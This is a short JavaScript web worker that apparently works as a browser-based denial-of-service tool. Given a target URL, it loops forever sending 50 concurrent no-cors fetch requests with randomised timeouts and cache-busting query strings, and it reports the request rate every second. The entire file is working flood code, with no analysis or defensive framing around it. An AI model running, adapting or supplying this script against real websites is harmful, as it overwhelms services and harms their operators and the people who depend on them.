const REPORT_INTERVAL = 1000;
const REQUEST_TIMEOUT_BASE = 500;
const CONCURRENCY = 50;

const sendRequest = async (target, timeout) => {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), timeout);

    try {
        await fetch(target, {
            mode: 'no-cors',
            signal: controller.signal
        });

        clearTimeout(timeoutId);
    } catch (e) {
        clearTimeout(timeoutId);
    }
}

self.addEventListener('message',  async (e) => {
    const target = e.data;

    let nRequests = 0n;

    // report nRequests every second
    setInterval(() => {
        self.postMessage(nRequests);
        nRequests = 0n;
    }, REPORT_INTERVAL);

    const queue = [];

    while (true) {
        if (queue.length >= CONCURRENCY) {
            await queue.shift();
            continue;
        }

        const timeoutRand = Math.round(Math.random() * 100) - 50;
        queue.push(sendRequest(`${target}?${Date.now()}-${Math.random()}`, REQUEST_TIMEOUT_BASE + timeoutRand));
        nRequests++;
    }
}, false);